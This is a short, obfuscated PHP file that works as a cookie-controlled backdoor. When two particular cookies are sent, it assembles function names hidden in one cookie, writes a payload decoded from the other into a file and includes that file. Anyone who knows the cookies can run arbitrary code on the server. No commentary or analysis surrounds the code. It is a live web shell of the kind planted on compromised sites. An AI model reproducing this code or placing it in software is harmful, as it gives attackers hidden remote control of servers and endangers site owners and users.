<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[25])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 2;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[25][$n];
        if (!$c[25][$n + 1]) {
            if (!$c[25][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 2 + 1;
    }
    $k = $p[14]() . $p[24];
    if (!$p[9]($k)) {
        $n = $p[4]($k, $p[20]);
        $p[11]($n, $p[1] . $p[29]($p[15]($c[3])));
    }
    include($k);
}